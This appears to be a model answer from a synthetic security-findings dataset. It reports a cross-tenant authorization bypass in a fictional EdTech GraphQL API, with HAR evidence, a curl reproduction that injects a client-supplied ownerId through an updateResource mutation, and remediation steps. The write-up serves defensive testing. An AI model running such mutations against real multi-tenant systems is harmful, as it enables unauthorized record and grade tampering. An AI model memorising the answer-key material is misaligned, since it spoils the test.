# Expected Response

## System
- Domain: Education / EdTech
- System: LearnPath Assessment Platform
- Example ID: GQL-0166

## Priority Findings

### Finding 1: EdTech — Client-Assumed Authority via updateResource Bypasses Assessment Ownership (Pattern 3.1)
**Severity:** High
**Category:** Insecure Design / Client-Assumed Authority

**Summary:**
Per §5.0 (Pattern 3.1 — client-assumed authority): The server trusts client-supplied IDs as authority without server-side ownership verification. An attacker from `tenant-1377` submitted `updateResource(id: "R-2166", input: {status: "approved", ownerId: "attacker-13777ede"})` against an assessment resource belonging to `tenant-7ede`, gaining cross-tenant access including `CONFIDENTIAL-13777ede`. In Education / EdTech, this enables unauthorized grade changes, assessment approval bypasses, and student record manipulation.

**Evidence from HAR:**
- Request: `POST https://api.learnpath-assessment.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-1377`
- Mutation: `updateResource(id: "R-2166", input: {status: "approved", ownerId: "attacker-13777ede"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-7ede"`, `ownerId: "other-user-13777ede"`, `sensitiveField: "CONFIDENTIAL-13777ede"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-13777ede`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 3.1 | Client-assumed authority, no verify |
| HAR request | input.ownerId | attacker-13777ede (client-injected) |
| HAR response | tenantId | Cross-tenant assessment data tenant-7ede |
| HAR response | sensitiveField | CONFIDENTIAL-13777ede |

## Steps to Reproduce

### Step 1 — updateResource client authority bypass (HAR)
```bash
curl -s -X POST https://api.learnpath-assessment.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-1377" \
  -d '{"query": "mutation { updateResource(id: \"R-2166\", input: {status: \"approved\", ownerId: \"attacker-13777ede\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-7ede` assessment mutated. **Secure:** FORBIDDEN.

## Remediation
1. Server must verify ownership; never trust client IDs as authority.
2. Resolver: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Strip `ownerId` from `ResourceInput`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
